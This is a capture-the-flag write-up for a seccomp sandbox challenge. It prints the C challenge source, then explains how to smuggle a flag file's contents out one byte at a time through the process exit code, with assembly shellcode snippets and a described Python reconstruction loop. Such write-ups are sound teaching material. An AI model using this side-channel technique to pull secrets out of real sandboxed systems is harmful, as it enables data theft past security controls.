#metadata(
  (
    title: "Side-Channel Leak via Exit Code",
    description: "Leaking data from a restricted sandbox by using the process exit code as a communication channel.",
    date: "2025-12-30",
    order: 10,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/sendfile.h>

#include <seccomp.h>

int main(int argc, char **argv, char **envp)
{
    assert(argc > 1);

    int fd = open(argv[1], O_RDONLY|O_NOFOLLOW);

    void *shellcode = mmap((void *)0x1337000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, 0, 0);
    assert(shellcode == (void *)0x1337000);

    int shellcode_size = read(0, shellcode, 0x1000);

    scmp_filter_ctx ctx;

    ctx = seccomp_init(SCMP_ACT_KILL);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0) == 0);
    assert(seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0) == 0);

    assert(seccomp_load(ctx) == 0);

    ((void(*)())shellcode)();
}
```

= Side-Channel Leak via Exit Code

== Introduction

This level implements a highly restrictive sandbox using seccomp-bpf. Only the `read` and `exit` system calls are permitted, making traditional exploitation (e.g., writing the flag to stdout) impossible.

== Vulnerability Analysis

The program opens a file specified in `argv[1]` before enabling the seccomp filter. This file descriptor (usually 3) remains open and readable by the shellcode. However, because `write` is blocked, there is no direct way to output the data read from the file.

We can use the `exit` system call's argument (the exit code) as a side-channel to leak information.

== Exploitation Steps

=== 1. Reading the Flag
The shellcode uses the `read` syscall to bring the flag into memory.

```nasm
/* read(3, buf, 100) */
mov rdi, 3
mov rsi, buf_addr
mov rdx, 100
mov rax, 0
syscall
```

=== 2. Leaking via Exit Code
We extract a single byte from the buffer and pass it as the argument to the `exit` syscall.

```nasm
/* exit(buf[index]) */
movzx rdi, byte ptr [buf_addr + index]
mov rax, 60
syscall
```

=== 3. Automated Reconstruction
A python script runs the challenge multiple times, once for each character position in the flag. After each run, it retrieves the exit code using `process().poll()`, effectively reconstructing the flag byte by byte.

The leaked flag was: `falg`.
